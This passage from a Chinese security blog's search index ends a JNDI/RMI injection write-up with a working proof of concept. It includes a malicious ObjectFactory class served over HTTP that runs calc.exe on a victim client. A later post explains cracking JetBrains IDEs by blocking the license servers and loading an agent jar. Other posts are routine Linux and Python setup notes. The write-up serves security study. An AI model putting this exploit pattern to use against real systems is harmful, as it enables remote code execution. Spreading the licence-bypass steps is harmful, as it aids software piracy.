aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击者起的http服务提供恶意class下载：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Name<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>ObjectFactory<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExecTest</span> <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span> Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"xterm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">exec</span><span class="token punctuation">(</span>String cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：ExecTest不要写包名</p><p>编译成class文件：<code>javac ExecTest.java</code><br>部署在web服务上：<code>py -3 -m http.server 8081</code></p><p>受害者的客户端（攻击者可控lookup参数指向攻击者的恶意Reference）</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>thonsun<span class="token punctuation">.</span>demo2<span class="token punctuation">.</span>client<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Project: JavaSec * @Desc: * @Author: thonsun * @Create: 2020/12/25 18:23 **/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIClient</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String uri <span class="token operator">=</span> <span class="token string">"rmi://192.168.58.131:1099/evil"</span><span class="token punctuation">;</span>        Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行Registry</p><p>运行Client</p><p>Client运行效果，RCE触发弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225185600551.png" alt="image-20201225185600551"></p><p>攻击者搭建的恶意Registry，绑定的Referece指向恶意Class【ExecTest】，受害机器（RMI 客户端的lookup参数可控）成功执行恶意Class</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>这里以一个导图总结</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201225111421061.png" alt="image-20201225111421061"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1.java rmi tutorials: <a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a></p><p>2.jvm codebase: <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html</a> </p><p>3.<a href="https://github.com/NickstaDB/SerializationDumper" target="_blank" rel="noopener">SerializationDumper</a></p><p>4.<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a></p><p>5.<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a></p><p>6.<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener">Object Serialization Stream Protocol</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> javasec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec jndi注入利用分析</title>
      <link href="/2020/12/02/jndi-zhu-ru-li-yong-fen-xi/"/>
      <url>/2020/12/02/jndi-zhu-ru-li-yong-fen-xi/</url>
      
        <content type="html"><![CDATA[<p>在fastjson反序列化漏洞利用的学习中引出了JNDI的利用攻击方式，JNDI(Java Naming and Directory Interface)实际可以理解为一个编程接口，</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> javasec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec Fastjson反序列化漏洞利用原理</title>
      <link href="/2020/11/20/fastjson-fan-xu-lie-hua-lou-dong-li-yong-yuan-li/"/>
      <url>/2020/11/20/fastjson-fan-xu-lie-hua-lou-dong-li-yong-yuan-li/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec Fastjson反序列漏洞攻防历史</title>
      <link href="/2020/11/10/fastjson-fan-xu-lie-lou-dong-gong-fang-li-shi/"/>
      <url>/2020/11/10/fastjson-fan-xu-lie-lou-dong-gong-fang-li-shi/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec Jackjson反序列化漏洞利用原理</title>
      <link href="/2020/11/02/jackjson-fan-xu-lie-hua-lou-dong-li-yong-yuan-li/"/>
      <url>/2020/11/02/jackjson-fan-xu-lie-hua-lou-dong-li-yong-yuan-li/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec Jackjson反序列漏洞攻防历史</title>
      <link href="/2020/10/24/jackjson-fan-xu-lie-lou-dong-gong-fang-li-shi/"/>
      <url>/2020/10/24/jackjson-fan-xu-lie-lou-dong-gong-fang-li-shi/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaSec java反序列化漏洞利用分析</title>
      <link href="/2020/10/20/java-fan-xu-lie-hua-lou-dong-li-yong-fen-xi/"/>
      <url>/2020/10/20/java-fan-xu-lie-hua-lou-dong-li-yong-fen-xi/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>环境配置</title>
      <link href="/2019/12/29/huan-jing-pei-zhi/"/>
      <url>/2019/12/29/huan-jing-pei-zhi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><p>整理常用的win | linux环境，包括开发用环境：Jetbrain全家桶crack过程；</p><a id="more"></a><h2 id="Jetbrains全家桶"><a href="#Jetbrains全家桶" class="headerlink" title="Jetbrains全家桶"></a>Jetbrains全家桶</h2><ol><li>关注最新的 <a href="https://github.com/wenyanjun/free" target="_blank" rel="noopener">refer</a> 【重要】</li></ol><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201204200403.png" alt=""></p><p>2.以IDEA为例</p><p>2.1 官网下载对应版本 2020.2.2并安装</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201204200802.png" alt=""></p><p>2.2 禁止IDEA联网,以win为列【重要】</p><p>hosts：</p><pre><code>127.0.0.1 fls.jetbrains-agent.com0.0.0.0 account.jetbrains.com</code></pre><p>防火墙规则</p><p>win+r -&gt; <code>wf.msc</code> -&gt; 出站规则 -&gt; 右键新建</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201204201209.png" alt=""></p><p>2.3选择evlate free try 30进入编辑界面 ，将最新的java-agent.jar拖入，重启，填入参数，code即可</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201204201356.png" alt=""></p><h2 id="xmind"><a href="#xmind" class="headerlink" title="xmind"></a>xmind</h2><blockquote><p><a href="http://www.52pjb.net/xiazai/image/894.html" target="_blank" rel="noopener">refer</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从安装第三方软件学习Ubuntu配置</title>
      <link href="/2019/12/28/cong-an-zhuang-di-san-fang-ruan-jian-xue-xi-ubuntu-pei-zhi/"/>
      <url>/2019/12/28/cong-an-zhuang-di-san-fang-ruan-jian-xue-xi-ubuntu-pei-zhi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><p>在这篇文章中，将学到：</p><ul><li>Ubuntu安装软件从系统源到第三方软件源配置</li><li>Ubuntu安装软件默认配置（路径，环境变量）</li><li>待添加</li></ul><a id="more"></a><h4 id="软件更新"><a href="#软件更新" class="headerlink" title="软件更新"></a>软件更新</h4><p>Ubuntu16.04 默认安装了python3.5和python2.7，但是没有安装对应的pip包管理器。在进行 <code>sudo apt-get install python-pip</code>和 <code>sudo apt-get install python3-pip</code> 或默认根据系统版本python下载安装对应的python -pip包。在python解析器中2.7和3.6为稳定版本。下面将更新系统python3.5到python3.6：</p><p><strong>系统软件默认路径</strong></p><p>Ubuntu对默认安装的路径为 <code>usr/lib</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1577521391645.png" alt="1577521391645"></p><p>但其安装的软件目录结构不同于windows平台下的配置（环境变量）</p><p>在Linux下：</p><p>软件的可执行文件（将要配置在环境变量$PATH中）与python 包dict-package分散在 <code>/usr/bin</code> 与 <code>/usr/lib/pythonX</code>中。在 <code>/usr/bin</code>中多为一个链接文件：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1577521639757.png" alt="1577521639757"></p><p>在Windows上：</p><p>系统环境变量的顺序决定了优先配置运行哪个版本的同名exe:</p><ol><li><p><code>pip -V</code></p></li><li><p><code>virtualenv -V</code>  （python2,python3都可以通过virtualenv <code>pythonX -m pip install vitualenv</code>创建虚拟环境，只是python3封装了<code>python -m venv workname</code>）</p></li></ol><h4 id="系统支持多版本软件共存配置"><a href="#系统支持多版本软件共存配置" class="headerlink" title="系统支持多版本软件共存配置"></a>系统支持多版本软件共存配置</h4><p><em>不要更改系统python3-&gt;python3.5的连接</em></p><p>Ubuntu支持对多版本软件工具默认自动切换：</p><ul><li>php5.7 php7.0</li><li>python.5 python3.6</li></ul><p>不过是建立软件链接的关系：（如在/usr/bin目录下）</p><p>Ubuntu支持工具<a href="https://blog.csdn.net/JasonDing1354/article/details/50470109" target="_blank" rel="noopener">update-alternatives</a> 对默认版本的控制（不用每次都删除链接更新链接）</p><p>在此处使用update-alternatives 对python3的版本进行管理：</p><pre class="line-numbers language-shell"><code class="language-shell">sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.5 1sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 2sudo update-alternatives --config python3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面步骤存在bug:</p><p>due to this <a href="https://bugs.launchpad.net/ubuntu/+source/python3.6/+bug/1631367" target="_blank" rel="noopener">bug</a>, gnome-terminal won’t launch after step 3, a workaround is running following commands to recreate the symlink:</p><pre class="line-numbers language-shell"><code class="language-shell">sudo update-alternatives --remove python3 /usr/bin/python3.5sudo update-alternatives --remove python3 /usr/bin/python3.6# 解决终端启动不了问题sudo rm /usr/bin/python3sudo ln -s python3.6 /usr/bin/python3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="第三方软件源安装"><a href="#第三方软件源安装" class="headerlink" title="第三方软件源安装"></a>第三方软件源安装</h4><p>关于python3.6在Ubuntu16.04的安装 <a href="https://vsupalov.com/developing-with-python3-6-on-ubuntu-16-04/" target="_blank" rel="noopener">参考</a></p><p>在Ubuntu上安装软件 托管于系统源的可以直接通过apt-get进行命令安装，国内镜像源（清华，阿里）是对其的复制，但其他的软件在安装源中找不到版本的需要通过第三方安装源进行安装：<a href="https://www.cnblogs.com/EasonJim/p/7119331.html" target="_blank" rel="noopener">PPA</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1577523168265.png" alt="1577523168265"></p><p>可以通过手动命令行，界面添加、删除<a href="https://blog.csdn.net/lu_embedded/article/details/55803500" target="_blank" rel="noopener">PPA</a></p><pre class="line-numbers language-shell"><code class="language-shell">sudo apt-get install software-properties-commonsudo add-apt-repository ppa:jonathonf/python-3.6 sudo apt-get update sudo apt-get install python3.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但此处的jonathonf已经失效，要更改 ppa：</p><pre class="line-numbers language-shell"><code class="language-shell">sudo add-apt-repository ppa:deadsnakes/ppasudo apt-get updatesudo apt-get install python3.6ls /usr/bin/ | grep pythonls /usr/lib/ | grep python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python-虚拟环境使用"><a href="#python-虚拟环境使用" class="headerlink" title="python 虚拟环境使用"></a>python 虚拟环境使用</h4><p>python2|python3都支持 virtualenv进行虚拟执行环境，python3增加对 <code>python3 -m venv name</code> 的支持</p><pre class="line-numbers language-shell"><code class="language-shell">virtualenv -hvirtualenv -p /usr/bin/python2.7 env2.7virtualenv -p /usr/bin/python3.5 env3.5source env2.7/bin/activatepython3 -m venv name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>virtualenvwrapper使用</p><p><a href="https://segmentfault.com/a/1190000012030061" target="_blank" rel="noopener">参考</a></p><pre class="line-numbers language-shell"><code class="language-shell">pip install virtualenvwrapper-winpip install virtualenvwrapper        # linux环境# pip可以是任何版本find / -name virtualenvwrapper.sh找到路径之后在/etc/profile中进行配置：export WORKON_HOME=/root/virtualenvssource /usr/bin/virtualenvwrapper.sh之后source /etc/profile创建基本环境：mkvirtualenv [环境名]mkvirtualenv -p python3.6 py3mkvirtualenv -p python2.7 py2mkvirtualenv student-env -p 'which python3.6'删除环境：rmvirtualenv [环境名]激活环境：workon [环境名]退出环境：deactivate列出所有环境：workon 或者 lsvirtualenv -b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pip 安装指定版本：<br>pip install django~= 1.11 </p><p>~= 安装Django1.11的最新版本 </p><h4 id="Linux-环境变量"><a href="#Linux-环境变量" class="headerlink" title="Linux 环境变量"></a>Linux 环境变量</h4><p>Linux是一个多用户多任务的操作系统，可以在Linux中为不同的用户设置不同的运行环境，具体做法是设置不同用户的环境变量。</p><p><strong>Linux环境变量分类</strong></p><p>一、按照生命周期来分，Linux环境变量可以分为两类：<br> 1、永久的：需要用户修改相关的配置文件，变量永久生效。<br> 2、临时的：用户利用export命令，在当前终端下声明环境变量，关闭Shell终端失效。</p><p>二、按照作用域来分，Linux环境变量可以分为：<br> 1、系统环境变量：系统环境变量对该系统中所有用户都有效。<br> 2、用户环境变量：顾名思义，这种类型的环境变量只对特定的用户有效。</p><p><strong>Linux设置环境变量的方法</strong></p><p>一、在<code>/etc/profile</code>文件中添加变量 <strong>对所有用户生效（永久的）</strong><br> 用vim在文件<code>/etc/profile</code>文件中增加变量，该变量将会对Linux下所有用户有效，并且是“永久的”。<br> 例如：编辑/etc/profile文件，添加CLASSPATH变量</p><pre class="line-numbers language-bash"><code class="language-bash">  vim /etc/profile      <span class="token function">export</span> CLASSPATH<span class="token operator">=</span>./JAVA_HOME/lib<span class="token punctuation">;</span><span class="token variable">$JAVA_HOME</span>/jre/lib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注：修改文件后要想马上生效还要运行<code>source /etc/profile</code>不然只能在下次重进此用户时生效。<br> 二、在用户目录下的.bash_profile文件中增加变量 <strong>【对单一用户生效（永久的）】</strong><br> 用<code>vim ~/.bash_profile</code>文件中增加变量，改变量仅会对当前用户有效，并且是“永久的”。</p><pre class="line-numbers language-bash"><code class="language-bash">vim ~/.bash.profile<span class="token function">export</span> CLASSPATH<span class="token operator">=</span>./JAVA_HOME/lib<span class="token punctuation">;</span><span class="token variable">$JAVA_HOME</span>/jre/lib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注：修改文件后要想马上生效还要运行$ source ~/.bash_profile不然只能在下次重进此用户时生效。<br> 三、直接运行export命令定义变量 <strong>【只对当前shell（BASH）有效（临时的）】</strong><br> 在shell的命令行下直接使用<code>export 变量名=变量值</code><br> 定义变量，该变量只在当前的shell（BASH）或其子shell（BASH）下是有效的，shell关闭了，变量也就失效了，再打开新shell时就没有这个变量，需要使用的话还需要重新定义。</p><p><strong>Linux环境变量使用</strong></p><p>一、Linux中常见的环境变量有：</p><ul><li>PATH：指定命令的搜索路径</li></ul><blockquote><p><strong>PATH声明用法：</strong><br> PATH=$PAHT:&lt;PATH 1&gt;:&lt;PATH 2&gt;:&lt;PATH 3&gt;:——–:&lt; PATH  n &gt;<br> export PATH<br> 你可以自己加上指定的路径，中间用冒号隔开。环境变量更改后，在用户下次登陆时生效。<br> 可以利用<code>echo $PATH</code>查看当前当前系统PATH路径。</p></blockquote><ul><li>HOME：指定用户的主工作目录（即用户登陆到Linux系统中时，默认的目录）。</li><li>HISTSIZE：指保存历史命令记录的条数。</li><li>LOGNAME：指当前用户的登录名。</li><li>HOSTNAME：指主机的名称，许多应用程序如果要用到主机名的话，通常是从这个环境变量中来取得的</li><li>SHELL：指当前用户用的是哪种Shell。</li><li>LANG/LANGUGE：和语言相关的环境变量，使用多种语言的用户可以修改此环境变量。</li><li>MAIL：指当前用户的邮件存放目录。</li></ul><p>注意：上述变量的名字并不固定，如HOSTNAME在某些Linux系统中可能设置成HOST</p><p>二、Linux也提供了修改和查看环境变量的命令，下面通过几个实例来说明：</p><ul><li>echo         显示某个环境变量值 echo $PATH</li><li>export   设置一个新的环境变量 export HELLO=”hello” (可以无引号)</li><li>env      显示所有环境变量</li><li>set      显示本地定义的shell变量</li><li>unset        清除环境变量 unset HELLO</li><li>readonly     设置只读环境变量 readonly HELLO</li></ul><p>三、C程序调用环境变量函数</p><ul><li>getenv()返回一个环境变量。</li><li>setenv()设置一个环境变量。</li><li>unsetenv()清除一个环境变量。</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Useful trick for linuxs work</title>
      <link href="/2019/10/23/useful-trick-for-linuxs-work/"/>
      <url>/2019/10/23/useful-trick-for-linuxs-work/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><a id="more"></a><h3 id="find-special-content-and-locate-the-file"><a href="#find-special-content-and-locate-the-file" class="headerlink" title="find special content and locate the file"></a>find special content and locate the file</h3><p>for source file:</p><p><code>find . -name "*.php" | xargs grep "function_name"</code></p><h3 id="setup-Ubuntu-16-04"><a href="#setup-Ubuntu-16-04" class="headerlink" title="setup Ubuntu 16.04"></a>setup Ubuntu 16.04</h3><p>国内开源镜像站（如华为，阿里）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedHat基本使用</title>
      <link href="/2019/09/20/redhat-ji-ben-shi-yong/"/>
      <url>/2019/09/20/redhat-ji-ben-shi-yong/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h2 id="一、记录RedHat基本使用"><a href="#一、记录RedHat基本使用" class="headerlink" title="一、记录RedHat基本使用"></a>一、记录RedHat基本使用</h2><p>用惯Ubuntu还得是要走出舒服区去踩坑RedHat了</p><a id="more"></a><h2 id="二、RedHat使用bug记录"><a href="#二、RedHat使用bug记录" class="headerlink" title="二、RedHat使用bug记录"></a>二、RedHat使用bug记录</h2><h3 id="2-1-yum软件源与软件安全"><a href="#2-1-yum软件源与软件安全" class="headerlink" title="2.1 yum软件源与软件安全"></a>2.1 yum软件源与软件安全</h3><p>使用yum安装软件报错</p><pre><code>This system is not registered to Red Hat Subscription Management.You can use subscription-manager to register</code></pre><p><strong>2.1.1 卸载yum</strong></p><pre class="line-numbers language-shell"><code class="language-shell"># 查询已安装软件rpm -qa|grep yumrpm -qa|grep yum|xargs rpm -e --nodepsrpm -qa|grep yum<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2.1.2 替换国内镜像源</strong></p><pre class="line-numbers language-shell"><code class="language-shell"># http://mirrors.163.com/centos/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考资料</p><blockquote><p><a href="https://www.jianshu.com/p/25a63cbf1e9d" target="_blank" rel="noopener">redhat更换yum源1</a></p><p><a href="https://blog.csdn.net/vist_1/article/details/79162678" target="_blank" rel="noopener">redhat更换yum源2</a></p><p><a href="https://www.cnblogs.com/chenfulin5/p/10551078.html" target="_blank" rel="noopener">redhat7.5更换yum源</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LIEF在CTFpatch常用API</title>
      <link href="/2019/07/27/lief-zai-ctfpatch-chang-yong-api/"/>
      <url>/2019/07/27/lief-zai-ctfpatch-chang-yong-api/</url>
      
